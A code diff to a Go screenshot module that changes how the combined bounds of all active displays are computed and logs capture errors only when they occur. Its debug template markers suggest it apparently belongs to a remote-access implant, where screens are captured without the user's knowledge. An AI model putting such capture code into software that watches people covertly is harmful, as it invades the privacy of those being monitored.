@@ -20,6 +20,7 @@ package screen
 
 import (
 	"bytes"
+	"image"
 	"image/png"
 
 	//{{if .Config.Debug}}
@@ -28,7 +29,7 @@ import (
 	screen "github.com/kbinani/screenshot"
 )
 
-//Screenshot - Retrieve the screenshot of the active displays
+// Screenshot - Retrieve the screenshot of the active displays
 func Screenshot() []byte {
 	return WindowsCapture()
 }
@@ -37,19 +38,19 @@ func Screenshot() []byte {
 func WindowsCapture() []byte {
 	nDisplays := screen.NumActiveDisplays()
 
-	var height, width int = 0, 0
+	var all image.Rectangle = image.Rect(0, 0, 0, 0)
+
 	for i := 0; i < nDisplays; i++ {
 		rect := screen.GetDisplayBounds(i)
-		if rect.Dy() > height {
-			height = rect.Dy()
-		}
-		width += rect.Dx()
+		all = rect.Union(all)
 	}
-	img, err := screen.Capture(0, 0, width, height)
+	img, err := screen.Capture(all.Min.X, all.Min.Y, all.Dx(), all.Dy())
 
-	//{{if .Config.Debug}}
-	log.Printf("Error Capture: %s", err)
-	//{{end}}
+	if err != nil {
+		//{{if .Config.Debug}}
+		log.Printf("Error Capture: %s", err)
+		//{{end}}
+	}
 
 	var buf bytes.Buffer
 	if err != nil {
